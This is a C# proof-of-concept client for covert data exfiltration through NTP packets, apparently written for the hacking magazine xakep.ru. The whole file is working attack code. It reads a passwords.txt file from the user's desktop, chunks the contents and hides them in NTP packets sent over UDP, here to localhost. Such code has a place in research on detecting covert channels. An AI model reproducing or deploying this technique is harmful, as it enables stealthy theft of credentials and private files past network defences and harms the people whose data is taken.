// NTP tunneling technique PoC implementation
// Made by Hackcat specially for https://xakep.ru

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using NtpTun_PoC;

namespace NtpTun_Client
{
    class Program
    {
        static Dictionary<byte, byte[]> packets = new Dictionary<byte, byte[]>();
        static void Main(string[] args)
        {
            //Get some private data
            //For example, contents of `passwords.txt` on user's desktop
            String path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "passwords.txt");
            String contents = File.ReadAllText(path);
            Console.WriteLine($"Succesflly got private data:\r\n{contents}");
            contents += "TRANSFER COMPLETE"; //Add 17 bytes more to guaranteely send 2 or more packets
            //Now split by 17 bytes each
            int ctr = 0;
            List<byte[]> pcs = new List<byte[]>();
            int BYTE_CNT = 17;
            byte[] current = new byte[BYTE_CNT];
            foreach (var cb in Encoding.ASCII.GetBytes(contents))
            {
                if (ctr == BYTE_CNT)
                {
                    //BYTE_CNT bytes added, start new iteration
                    byte[] bf = new byte[BYTE_CNT];
                    current.CopyTo(bf, 0);
                    pcs.Add(bf);
                    String deb = Encoding.ASCII.GetString(bf);
                    ctr = 0;
                    for (int i = 0; i < BYTE_CNT; i++) current[i] = 0x0;
                }
                if (cb == '\n' || cb == '\r')
                {
                    current[ctr] = Encoding.ASCII.GetBytes("_")[0];
                }
                else current[ctr] = cb;
                ctr++;
            }
            //OK split
            Console.WriteLine($"OK split into {pcs.Count} parts");
            //Now send
            UDPSocket socket = new UDPSocket();
            socket.Client("127.0.0.1", 123);
            byte pkt_id = 0;
            int total_sent = 0;
            Stopwatch sw = new Stopwatch();
            sw.Start();
            foreach (var ci in pcs)
            {
                NtpPacket ntp = new NtpPacket();
                ntp = ntp.EmbedDataToPacketC(ci);
                byte[] result = ntp.BuildPacket();
                result[5] = pkt_id;
                packets.Add(pkt_id, result);
                Console.WriteLine($"Sending: {Encoding.ASCII.GetString(result)}");
                socket.Send(result);
                Thread.Sleep(200);
                total_sent += result.Length;
                pkt_id++;
            }
            sw.Stop();
            Console.WriteLine($"Sent {pkt_id} packets in {sw.ElapsedMilliseconds} ms. Avg speed: {total_sent / ((double)((double)sw.ElapsedMilliseconds / (double)1000))} B/s");
            
            Console.WriteLine("Finised. Press any key to close...");
            Console.ReadKey(true);
        }
        private static void ResendMissingPacket(byte packet_id)
        {

        }
    }
}
